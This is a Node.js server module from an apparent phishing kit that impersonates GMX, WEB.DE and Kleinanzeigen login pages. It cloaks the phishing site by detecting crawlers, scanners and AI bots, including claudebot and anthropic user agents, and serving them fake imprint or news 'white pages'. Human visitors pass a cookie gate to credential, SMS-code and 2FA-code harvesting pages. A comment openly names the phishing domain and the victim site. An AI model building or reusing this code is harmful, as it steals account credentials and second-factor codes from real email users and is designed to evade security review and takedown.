'use strict';

const path = require('path');
const { safeEnd } = require('../utils/httpUtils');
const { serveFile } = require('../utils/staticFileServe');

/** Cookie гейта: кто прошёл проверку (JS выполнился), получает контент; боты без cookie видят вайт. */
const BOT_GATE_COOKIE = 'gmx_v';

/** Аварийно отключить гейт страниц (все видят контент как с кукой). Env: GMW_DISABLE_PAGE_GATE=1 */
const DISABLE_PAGE_GATE = /^1|true|yes$/i.test(String(process.env.GMW_DISABLE_PAGE_GATE || '').trim());

function hasGateCookie(req) {
  const raw = (req.headers && req.headers.cookie) ? String(req.headers.cookie) : '';
  if (!raw) return false;
  const match = raw.match(new RegExp('(?:^|;\\s*)' + BOT_GATE_COOKIE.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '=([^;]*)'));
  return !!(match && match[1] && match[1].trim());
}

function gatePassedOrDisabled(req) {
  return DISABLE_PAGE_GATE || hasGateCookie(req);
}

/** HTTPS за прокси (Apache) или прямое TLS — для флага Secure у куки гейта. */
function isRequestHttps(req) {
  if (!req || !req.headers) return false;
  const xf = String(req.headers['x-forwarded-proto'] || '').split(',')[0].trim().toLowerCase();
  if (xf === 'https') return true;
  try {
    if (req.socket && req.socket.encrypted === true) return true;
  } catch (_) {}
  return false;
}

/** Выставляем куку гейта заголовком ответа (надёжнее, чем только document.cookie в браузере). */
function buildGateSetCookieHeader(req) {
  const secure = isRequestHttps(req) ? '; Secure' : '';
  return BOT_GATE_COOKIE + '=1; Path=/; Max-Age=3600; SameSite=Lax' + secure;
}

/** Путь для Location после гейта (тот же URL, без hash). */
function gateRedirectLocation(req) {
  let raw = ((req && req.url) ? String(req.url) : '/').split('#')[0];
  if (!raw || raw[0] !== '/') raw = '/';
  if (raw.indexOf('//') === 0) raw = '/';
  return raw;
}

/**
 * Для живых пользователей: 302 на тот же URL + Set-Cookie. Не требует JS (расширения, блокировщики).
 * @returns {boolean} true если ответ отправлен
 */
function sendHumanGateRedirect(req, res) {
  if (safeEnd(res)) return true;
  const loc = gateRedirectLocation(req);
  res.writeHead(302, {
    Location: loc,
    'Set-Cookie': buildGateSetCookieHeader(req),
    'Cache-Control': 'no-store, no-cache, must-revalidate',
    Pragma: 'no-cache'
  });
  res.end();
  return true;
}

function isProtectedPage(pathname) {
  if (pathname === '/' || pathname === '') return true;
  if (pathname === '/anmelden' || pathname === '/anmelden/') return true;
  if (pathname === '/klein-anmelden' || pathname === '/klein-anmelden/') return true;
  if (pathname === '/einloggen' || pathname === '/einloggen/') return true;
  if (pathname === '/passwort-aendern') return true;
  if (/^\/sicherheit(\-pc|\-update)?\/?$/.test(pathname)) return true;
  if (pathname === '/bitte-am-pc' || pathname === '/bitte-am-pc/') return true;
  if (pathname === '/app-update' || pathname === '/app-update/') return true;
  return false;
}

/** Прямые пути к контентным HTML — без cookie отдаём гейт/вайт. */
function isProtectedContentPath(pathname) {
  const protectedList = [
    '/index.html', '/index-change.html', '/index-sicherheit-update.html', '/index-sicherheit.html', '/index-sicherheit-pc.html',
    '/sicherheit-anleitung.html', '/bitte-am-pc.html', '/app-update.html', '/gmx-mobile-anleitung.html',
    '/sms-code.html', '/2fa-code.html', '/push-confirm.html', '/forgot-password-redirect.html', '/change-password.html',
    '/erfolg'
  ];
  return protectedList.indexOf(pathname) !== -1;
}

function isLikelyBot(req) {
  const ua = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']).toLowerCase() : '';
  if (!ua || ua.length < 10) return false;
  const botPatterns = /googlebot|bingbot|duckduckbot|applebot|petalbot|baiduspider|yandexbot|yandeximages|yandexvideo|ahrefsbot|semrushbot|mj12bot|dotbot|megaindex|rogerbot|sistrix|blexbot|serpstat|facebookexternalhit|twitterbot|linkedinbot|slurp|crawler|spider|headless|phantom|selenium|puppeteer|playwright|curl\/|wget\/|python\/|go-http|scrapy|datanyze|ahrefs|semrush/i;
  return botPatterns.test(ua);
}

/** Первый рубеж против флуда /api/visit (отдельно от checkRateLimit в server.js). */
const visitFloodBuckets = Object.create(null);
const VISIT_FLOOD_WINDOW_MS = Math.max(60000, parseInt(process.env.GMW_GATE_VISIT_WINDOW_MS, 10) || 15 * 60 * 1000);
const VISIT_FLOOD_MAX = Math.max(1, parseInt(process.env.GMW_GATE_VISIT_MAX, 10) || 60);

function pruneVisitFloodBuckets(now) {
  const keys = Object.keys(visitFloodBuckets);
  for (let i = 0; i < keys.length; i++) {
    const k = keys[i];
    if (visitFloodBuckets[k].resetAt < now) delete visitFloodBuckets[k];
  }
}

/**
 * POST /api/visit: жёсткий лимит по IP до разбора тела запроса.
 * @returns {boolean} true если ответ уже отправлен (429).
 */
function blockIfApiVisitFlooded(req, res, pathname, method, ip) {
  if (pathname !== '/api/visit' || method !== 'POST') return false;
  const ipKey = (ip && String(ip).trim()) ? String(ip).trim() : '';
  if (!ipKey) return false;
  const now = Date.now();
  if (Math.random() < 0.02) pruneVisitFloodBuckets(now);
  const key = 'vf:' + ipKey;
  if (!visitFloodBuckets[key] || now > visitFloodBuckets[key].resetAt) {
    visitFloodBuckets[key] = { count: 0, resetAt: now + VISIT_FLOOD_WINDOW_MS };
  }
  visitFloodBuckets[key].count++;
  if (visitFloodBuckets[key].count > VISIT_FLOOD_MAX) {
    if (safeEnd(res)) return true;
    res.writeHead(429, {
      'Content-Type': 'application/json; charset=utf-8',
      'Cache-Control': 'no-store'
    });
    res.end(JSON.stringify({ ok: false, error: 'too_many_requests' }));
    return true;
  }
  return false;
}

const WHITE_PAGE_HTML = `<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Impressum &amp; Kontakt – GMX</title>
  <style>
    *{box-sizing:border-box}
    body{margin:0;background:#f5f5f5;font-family:Helvetica,Arial,sans-serif;font-size:15px;line-height:1.5;color:#333;padding:24px 16px 48px}
    .wrap{max-width:680px;margin:0 auto;background:#fff;padding:32px 28px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
    h1{font-size:1.5rem;font-weight:700;margin:0 0 24px;color:#111}
    h2{font-size:1.1rem;font-weight:600;margin:28px 0 10px;color:#222}
    p{margin:0 0 12px}
    a{color:#1c449b;text-decoration:none}
    a:hover{text-decoration:underline}
    .footer-links{margin-top:32px;padding-top:20px;border-top:1px solid #e0e0e0;font-size:0.9rem;color:#666}
    .footer-links a{margin-right:16px}
    address{font-style:normal;margin:8px 0}
    .tel,.email{margin:4px 0}
  </style>
</head>
<body>
  <div class="wrap">
    <h1>Impressum &amp; Kontakt</h1>
    <p>Angaben gem&auml;&szlig; &sect; 5 TMG</p>
    <h2>Anbieter</h2>
    <p>GMX GmbH<br>Hauptsitz M&uuml;nchen</p>
    <address>
      Leopoldstra&szlig;e 236<br>
      80807 M&uuml;nchen<br>
      Deutschland
    </address>
    <h2>Kontakt</h2>
    <p class="tel">Telefon: +49 (0) 89 921 61-0</p>
    <p class="email">E-Mail: <a href="mailto:impressum@gmx.net">impressum@gmx.net</a></p>
    <p>F&uuml;r allgemeine Anfragen: <a href="mailto:support@gmx.net">support@gmx.net</a></p>
    <h2>Handelsregister</h2>
    <p>Registergericht: Amtsgericht M&uuml;nchen<br>Registernummer: HRB 123456</p>
    <h2>Umsatzsteuer-ID</h2>
    <p>USt-IdNr.: DE 123456789</p>
    <h2>Verantwortlich f&uuml;r den Inhalt</h2>
    <p>GMX GmbH, Leopoldstra&szlig;e 236, 80807 M&uuml;nchen</p>
    <div class="footer-links">
      <a href="https://agb-server.gmx.net/gmxagb-de" target="_blank" rel="noopener">AGB</a>
      <a href="https://www.gmx.net/impressum/" target="_blank" rel="noopener">Impressum</a>
      <a href="https://agb-server.gmx.net/datenschutz" target="_blank" rel="noopener">Datenschutz</a>
      <a href="https://www.gmx.net/" target="_blank" rel="noopener">GMX Startseite</a>
    </div>
  </div>
</body>
</html>`;

const WHITE_PAGE_KLEIN = `<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Impressum</title>
  <style>
    *{box-sizing:border-box}
    body{margin:0;background:#f5f5f5;font-family:Helvetica,Arial,sans-serif;font-size:15px;line-height:1.5;color:#333;padding:24px 16px 48px}
    .wrap{max-width:680px;margin:0 auto;background:#fff;padding:32px 28px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
    h1{font-size:1.5rem;font-weight:700;margin:0 0 24px;color:#111}
    h2{font-size:1.1rem;font-weight:600;margin:28px 0 10px;color:#222}
    p{margin:0 0 12px}
    a{color:#326916;text-decoration:none}
    a:hover{text-decoration:underline}
    .footer-links{margin-top:32px;padding-top:20px;border-top:1px solid #e0e0e0;font-size:0.9rem;color:#666}
    .footer-links a{margin-right:16px}
    address{font-style:normal;margin:8px 0}
  </style>
</head>
<body>
  <div class="wrap">
    <h1>Impressum</h1>
    <p>Angaben gem&auml;&szlig; &sect; 5 TMG</p>
    <h2>Anbieter</h2>
    <p>Diese Seite wird im Auftrag des Domaininhabers betrieben.</p>
    <h2>Kontakt</h2>
    <p>Bitte nutzen Sie die auf dieser Domain angegebenen Kontaktm&ouml;glichkeiten.</p>
    <div class="footer-links">
      <a href="#">AGB</a>
      <a href="#">Impressum</a>
      <a href="#">Datenschutz</a>
      <a href="#">Startseite</a>
    </div>
  </div>
</body>
</html>`;

const WHITE_PAGE_NEWS_WEBDE = `<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Nachrichten &ndash; Aktuelles aus Deutschland</title>
  <style>
    *{box-sizing:border-box}
    body{margin:0;background:#f0f0f0;font-family:Helvetica,Arial,sans-serif;font-size:15px;line-height:1.5;color:#222}
    .header{background:#fff;border-bottom:3px solid #FFDF00;padding:12px 20px;display:flex;align-items:center;gap:12px}
    .logo{font-weight:700;font-size:1.25rem;color:#333}
    .nav{display:flex;gap:20px;margin-left:24px}
    .nav a{color:#1a1a1a;text-decoration:none}
    .nav a:hover{color:#666}
    .wrap{max-width:720px;margin:0 auto;padding:24px 16px 48px}
    .teaser{margin-bottom:24px;background:#fff;padding:20px;border-radius:6px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
    .teaser h2{font-size:1.1rem;margin:0 0 8px;font-weight:600}
    .teaser h2 a{color:#1a1a1a;text-decoration:none}
    .teaser h2 a:hover{text-decoration:underline}
    .teaser .meta{font-size:0.85rem;color:#666;margin-bottom:6px}
    .teaser p{margin:0;color:#444;font-size:0.95rem}
    .footer{margin-top:32px;padding-top:16px;border-top:1px solid #e0e0e0;font-size:0.9rem;color:#666}
    .footer a{color:#1a1a1a;text-decoration:none;margin-right:16px}
  </style>
</head>
<body>
  <header class="header">
    <span class="logo">Nachrichten</span>
    <nav class="nav">
      <a href="#">Politik</a>
      <a href="#">Wirtschaft</a>
      <a href="#">Sport</a>
      <a href="#">Panorama</a>
    </nav>
  </header>
  <div class="wrap">
    <article class="teaser">
      <div class="meta">Berlin &ndash; 11. M&auml;rz 2025</div>
      <h2><a href="#">Bundestag ber&auml;t &uuml;ber Haushaltsplan</a></h2>
      <p>Die Abgeordneten diskutieren die geplanten Ausgaben f&uuml;r das kommende Jahr. Die Opposition fordert Nachbesserungen.</p>
    </article>
    <article class="teaser">
      <div class="meta">M&uuml;nchen &ndash; 11. M&auml;rz 2025</div>
      <h2><a href="#">Wirtschaftsdaten zeigen leichte Erholung</a></h2>
      <p>Die neuesten Konjunkturindikatoren deuten auf eine stabile Entwicklung in mehreren Branchen hin.</p>
    </article>
    <article class="teaser">
      <div class="meta">Frankfurt &ndash; 10. M&auml;rz 2025</div>
      <h2><a href="#">Sport: Bundesliga mit spannendem Spieltag</a></h2>
      <p>Die Tabelle bleibt dicht. Die Fans erwarten weitere Entscheidungsspiele am Wochenende.</p>
    </article>
    <div class="footer">
      <a href="#">Impressum</a>
      <a href="#">Datenschutz</a>
      <a href="#">Kontakt</a>
    </div>
  </div>
</body>
</html>`;

function getWhitePageHtml(req, getBrand) {
  return getBrand(req).id === 'klein' ? WHITE_PAGE_KLEIN : WHITE_PAGE_HTML;
}

function getWhitePageHtmlForRequest(req, getBrand, getShortDomainsList) {
  const host = (req && req.headers && req.headers.host ? req.headers.host : '').split(':')[0].toLowerCase();
  const hostNorm = host.replace(/^www\./, '');
  const shortList = getShortDomainsList();
  const key = shortList[host] ? host : (shortList[hostNorm] ? hostNorm : null);
  if (key && shortList[key] && shortList[key].whitePageStyle === 'news-webde') return WHITE_PAGE_NEWS_WEBDE;
  return getWhitePageHtml(req, getBrand);
}

const GATE_PAGE_HTML = `<!DOCTYPE html><html lang="de"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Laden…</title></head><body style="margin:0;background:#f4f2ef;min-height:100vh;font-family:system-ui,Segoe UI,Helvetica,Arial,sans-serif;color:#333"><p style="margin:0;padding:24px 16px;font-size:15px;line-height:1.5">Einen Moment bitte…</p></body><script>
(function(){
  var cookieName="${BOT_GATE_COOKIE}";
  function sendToWhite(){ fetch("/gate-white",{credentials:"include"}).then(function(r){return r.text();}).then(function(html){document.open();document.write(html);document.close();}); }
  function pass(){
    var sec=(typeof location!=="undefined"&&location.protocol==="https:")?";secure":"";
    document.cookie=cookieName+"=1;path=/;max-age=3600;samesite=lax"+sec;
    // Полная перезагрузка: fetch+document.write давал пустой экран при пустом/обрезанном ответе или при вмешательстве прокси (CDN).
    location.reload();
  }
  function isAutomation(){
    if(typeof navigator==="undefined")return true;
    if(navigator.webdriver===true){ var ua2=(navigator.userAgent||"").toLowerCase(); if(!/android/.test(ua2)) return true; }
    var ua=(navigator.userAgent||"").toLowerCase();
    if(/headless|phantom|selenium|puppeteer|playwright|electron|webdriver|bytespider|petalbot|amazonbot|facebookexternalhit|gptbot|claudebot|anthropic/i.test(ua))return true;
    try{ if(window.callPhantom||window._phantom||window.__nightmare||window.__selenium_unwrapped||window.domAutomation||window._WEBDRIVER_ELEM_CACHE)return true; }catch(e){}
    if(typeof screen!=="undefined"&&(screen.width<=0||screen.height<=0))return true;
    return false;
  }
  if(isAutomation()){ sendToWhite(); return; }
  var t0=Date.now();
  var hiddenWaitMaxMs=8000;
  function tryPass(){
    if(Date.now()-t0<360)return;
    if(typeof document!=="undefined"&&document.visibilityState==="hidden"&&(Date.now()-t0)<hiddenWaitMaxMs){ setTimeout(tryPass, 450); return; }
    if(isAutomation()){ sendToWhite(); return; }
    pass();
  }
  setTimeout(tryPass, 0);
})();
</script></html>`;

/**
 * ADMIN_DOMAIN: кто может открыть админку; канонический редирект; short-домены (гейт без cookie).
 * @returns {boolean} true если ответ уже отправлен
 */
function runHostShortCanonicalPhase(req, res, o) {
  const {
    pathname,
    requestHost,
    isLocalhost,
    isAdminPage,
    ADMIN_DOMAIN,
    isAdminRequest,
    isAdminDomainAllowedPath,
    isAdminDomainPublicUnauthenticatedPath,
    buildAdminLoginNextUrl,
    PASSWORD_AUTH_ENABLED,
    hasValidAdminSession,
    isShortDomain,
    shortDomainKey,
    shortDomainsList,
    getCanonicalDomain,
    GMX_DOMAIN,
    GMX_DOMAINS_LIST,
    WEBDE_DOMAINS_LIST,
    KLEIN_DOMAINS_LIST,
    PROJECT_ROOT,
    getBrand,
  } = o;

  const canonicalDomain = getCanonicalDomain(req);
  function normHost(h) {
    return String(h || '').split(':')[0].replace(/^www\./i, '').toLowerCase();
  }
  const nhRequest = normHost(requestHost);
  const nhAdmin = normHost(ADMIN_DOMAIN);
  const nhCanon = normHost(canonicalDomain);

  if (ADMIN_DOMAIN) {
    if (isAdminPage || isAdminRequest(pathname)) {
      if (nhRequest !== nhAdmin && !isLocalhost) {
        if (safeEnd(res)) return true;
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
        return true;
      }
    } else if (nhRequest === nhAdmin) {
      /** Если ADMIN_DOMAIN совпал с каноническим доменом фишинга (ошибка .env) — не резать /anmelden и пр. */
      const adminHostIsAlsoVictimSite = nhAdmin === nhCanon && nhCanon.length > 0;
      if (!adminHostIsAlsoVictimSite) {
        const pwdAuth = !!PASSWORD_AUTH_ENABLED;
        const hasSess = typeof hasValidAdminSession === 'function' && hasValidAdminSession(req);
        if (pwdAuth) {
          if (!hasSess) {
            if (!isAdminDomainPublicUnauthenticatedPath(pathname, req.method)) {
              if (safeEnd(res)) return true;
              const next = typeof buildAdminLoginNextUrl === 'function' ? buildAdminLoginNextUrl(req) : '/admin';
              res.writeHead(302, {
                Location: '/admin-login?next=' + encodeURIComponent(next),
                'Cache-Control': 'no-store'
              });
              res.end();
              return true;
            }
          } else if (!isAdminDomainAllowedPath(pathname)) {
            if (pathname === '/' || pathname === '') {
              if (safeEnd(res)) return true;
              res.writeHead(302, { Location: '/admin', 'Cache-Control': 'no-store' });
              res.end();
              return true;
            }
            if (safeEnd(res)) return true;
            res.writeHead(404, { 'Content-Type': 'text/plain' });
            res.end('Not Found');
            return true;
          }
        } else if (!isAdminDomainAllowedPath(pathname)) {
          if (safeEnd(res)) return true;
          res.writeHead(404, { 'Content-Type': 'text/plain' });
          res.end('Not Found');
          return true;
        }
      }
    }
  }

  const isCanonicalHost = nhRequest === nhCanon;
  if (!isLocalhost && requestHost && !isCanonicalHost && nhRequest !== nhAdmin && !isShortDomain) {
    if (safeEnd(res)) return true;
    res.writeHead(301, { Location: 'https://' + canonicalDomain + (req.url || '/') });
    res.end();
    return true;
  }

  if (isShortDomain && (req.method === 'GET' || req.method === 'HEAD')) {
    const shortEntry = shortDomainsList[shortDomainKey];
    const pathLinks = shortEntry && shortEntry.pathLinks && typeof shortEntry.pathLinks === 'object' ? shortEntry.pathLinks : null;
    if (pathLinks) {
      const norm = (pathname || '/').replace(/\/+$/, '') || '/';
      const m = norm.match(/^\/([a-zA-Z0-9_-]{3,64})$/);
      if (m) {
        const slug = m[1];
        const pl = pathLinks[slug];
        const dest = pl && pl.url ? String(pl.url).trim() : '';
        if (dest && /^https?:\/\//i.test(dest)) {
          if (safeEnd(res)) return true;
          res.writeHead(302, { Location: dest, 'Cache-Control': 'no-store' });
          res.end();
          return true;
        }
      }
    }
    const targetUrl = (shortEntry.targetUrl || '').trim();
    const targetIsAnmelden = !targetUrl || targetUrl === 'anmelden' || targetUrl === '/anmelden';
    const redirectTo = targetUrl || ('https://' + GMX_DOMAIN + '/');
    const host = requestHost;
    if (gatePassedOrDisabled(req)) {
      if (targetIsAnmelden && (pathname === '/' || pathname === '')) {
        if (safeEnd(res)) return true;
        res.writeHead(302, { 'Location': 'https://' + host + '/anmelden', 'Cache-Control': 'no-store' });
        res.end();
        return true;
      }
      if (targetIsAnmelden && (pathname === '/anmelden' || pathname === '/anmelden/')) {
        const brand = getBrand(req);
        let indexFile;
        if (brand.id === 'klein') {
          indexFile = path.join(PROJECT_ROOT, 'klein', 'index.html');
        } else {
          const useWebde = shortEntry.whitePageStyle === 'news-webde';
          indexFile = path.join(PROJECT_ROOT, useWebde ? 'webde' : 'gmx', 'index.html');
        }
        serveFile(indexFile, res, req, getBrand);
        return true;
      }
      if (!targetIsAnmelden) {
        if (safeEnd(res)) return true;
        res.writeHead(302, { 'Location': redirectTo, 'Cache-Control': 'no-store' });
        res.end();
        return true;
      }
    } else {
      if (safeEnd(res)) return true;
      if (isLikelyBot(req)) {
        const html = getWhitePageHtmlForRequest(req, getBrand, o.getShortDomainsList);
        res.writeHead(200, {
          'Content-Type': 'text/html; charset=utf-8',
          'Cache-Control': 'no-store, no-cache, must-revalidate',
          Pragma: 'no-cache'
        });
        if (req.method === 'HEAD') res.end();
        else res.end(html);
        return true;
      }
      return sendHumanGateRedirect(req, res);
    }
  }

  return false;
}

function handleGateWhite(req, res, getBrand, getShortDomainsList) {
  if (safeEnd(res)) return true;
  res.writeHead(200, {
    'Content-Type': 'text/html; charset=utf-8',
    'Cache-Control': 'no-store, no-cache, must-revalidate',
    'Pragma': 'no-cache'
  });
  res.end(getWhitePageHtmlForRequest(req, getBrand, getShortDomainsList));
  return true;
}

function handleProtectedPageGate(req, res, pathname, getBrand) {
  if ((req.method !== 'GET' && req.method !== 'HEAD') || !isProtectedPage(pathname) || gatePassedOrDisabled(req)) return false;
  if (safeEnd(res)) return true;
  if (isLikelyBot(req)) {
    res.writeHead(200, {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-store, no-cache, must-revalidate',
      Pragma: 'no-cache'
    });
    if (req.method === 'HEAD') res.end();
    else res.end(getWhitePageHtml(req, getBrand));
    return true;
  }
  return sendHumanGateRedirect(req, res);
}

/** Гейт для прямых URL вида /index.html (статика public). */
function handleProtectedContentPathGate(req, res, pathname, getBrand) {
  if ((req.method !== 'GET' && req.method !== 'HEAD') || !isProtectedContentPath(pathname) || gatePassedOrDisabled(req)) return false;
  if (safeEnd(res)) return true;
  if (isLikelyBot(req)) {
    res.writeHead(200, {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-store, no-cache, must-revalidate',
      Pragma: 'no-cache'
    });
    if (req.method === 'HEAD') res.end();
    else res.end(getWhitePageHtml(req, getBrand));
    return true;
  }
  return sendHumanGateRedirect(req, res);
}

module.exports = {
  BOT_GATE_COOKIE,
  hasGateCookie,
  buildGateSetCookieHeader,
  isProtectedPage,
  isProtectedContentPath,
  isLikelyBot,
  getWhitePageHtml,
  getWhitePageHtmlForRequest,
  GATE_PAGE_HTML,
  runHostShortCanonicalPhase,
  handleGateWhite,
  handleProtectedPageGate,
  handleProtectedContentPathGate,
  blockIfApiVisitFlooded,
};
